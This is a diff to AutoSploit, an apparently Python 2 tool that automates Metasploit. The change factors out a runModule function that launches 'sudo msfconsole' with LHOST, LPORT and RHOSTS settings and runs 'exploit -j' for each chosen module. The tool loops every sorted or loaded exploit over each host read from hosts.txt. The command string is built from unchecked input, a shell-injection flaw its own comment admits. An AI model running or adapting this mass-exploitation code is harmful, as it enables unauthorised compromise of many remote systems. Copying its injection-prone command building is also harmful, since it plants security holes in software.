@@ -5,7 +5,7 @@ Autosploit Core, beta development version
 TODO LIST:
  - Splitting the subprocess calls with shlex line #72 (done)
  - Add the ability to read in modules list as JSON, if .txt file is provided convert to JSON before processing (done)
- - Fix the exploit issue line #125
+ - Fix the exploit function issue line #119
  - Fixing targets line #261
  - Fix clobber function line #281
  - Custom list importing line #317
@@ -109,6 +109,12 @@ def cmdline(command):
     )
     return process.communicate()[0]
 
+def runModule(workspace, local_host, local_port, rhosts, module):
+    # WARNING: POTENTIAL SECURITY RISK - UNTRUSTED INPUT TO SHELL: (Fix by V1.5)
+    command = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; use %s; exploit -j;'" % (
+            workspace, local_host, local_port, rhosts, module)
+    cmdline(command)
+
 
 def exploit(query=None, single=None):
     """Exploit component"""
@@ -123,7 +129,16 @@ def exploit(query=None, single=None):
     logo()
 
     sorted_modules = []
+    
+    thread = threading.Thread(target=animation, args=("loading modules", ))
+    thread.daemon = True
+    thread.start()
+    
     all_modules = []
+    for mod in loaded_exploits:
+        all_modules.append(mod)
+    
+    stop_animation = True
 
     if query is None:
         rhosts = single
@@ -134,22 +149,10 @@ def exploit(query=None, single=None):
             "[" + t.magenta("?") + "]Continue? [Y]es/[N]o: ").lower()
 
         if proceed == 'y':
-            thread = threading.Thread(
-                target=animation, args=("loading modules", ))
-            thread.daemon = True
-            thread.start()
-
-            for mod in loaded_exploits:
-                all_modules.append(mod)
-
-            stop_animation = True
-
             print("\n\n\n[{}]Done. Launching exploits.".format(t.green("+")))
             # TODO:/
             # exploit is not referenced anywhere around here
-            template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s'" % (
-                workspace, local_host, local_port, rhosts, exploit)
-            cmdline(template)
+            runModule(workspace, local_host, local_port, rhosts, exploit)
 
         elif proceed == 'n':
             print("[{}]Aborted. Returning to Main Menu".format(t.red("!")))
@@ -157,20 +160,7 @@ def exploit(query=None, single=None):
         else:
             print("[{}]Unhandled Option. Defaulting to Main Menu".format(t.red("!")))
 
-    else:
-
-        thread = threading.Thread(target=animation, args=(
-            "sorting modules by relevance, this may take awhile",
-        ))
-        thread.daemon = True
-        thread.start()
-
-        for mod in loaded_exploits:
-            all_modules.append(mod)
-
-        stop_animation = True
-
-    print("\n\n\n[{}]AutoSploit sorted the following MSF modules based search query relevance.\n".format(
+    print("\n\n\n[{}]AutoSploit sorted the following MSF modules based on search query relevance.\n".format(
         t.green("+")))
     # Print out the sorted modules
     for i, line in enumerate(sorted_modules, start=1):
@@ -181,22 +171,12 @@ def exploit(query=None, single=None):
     choice = raw_input(
         "\n[" + t.magenta("?") + "]Run sorted or all modules against targets? [S]orted/[A]ll: ").lower()
 
-    if choice == 's':
+    if (choice == 's') or (choice == 'a'):
         with open("hosts.txt", "rb") as host_list:
             for rhosts in host_list:
-                for exploit in sorted_modules:
-                    # WARNING: POTENTIAL SECURITY RISK - UNTRUSTED INPUT TO SHELL: (Fix by V1.5)
-                    template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s'" % (
-                        workspace, local_host, local_port, rhosts, exploit)
-                    cmdline(template)
-    elif choice == 'a':
-        with open("hosts.txt", "rb") as host_list:
-            for rhosts in host_list:
-                for exploit in all_modules:
-                    # WARNING: POTENTIAL SECURITY RISK - UNTRUSTED INPUT TO SHELL: (Fix by V1.5)
-                    template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s'" % (
-                        workspace, local_host, local_port, rhosts, exploit)
-                    cmdline(template)
+                module_list = (sorted_modules if choice == 's' else all_modules)
+                for module in module_list:
+                    runModule(workspace, local_host, local_port, rhosts, module)
     else:
         print("[{}]Unhandled Option. Defaulting to Main Menu".format(t.red("!")))
 
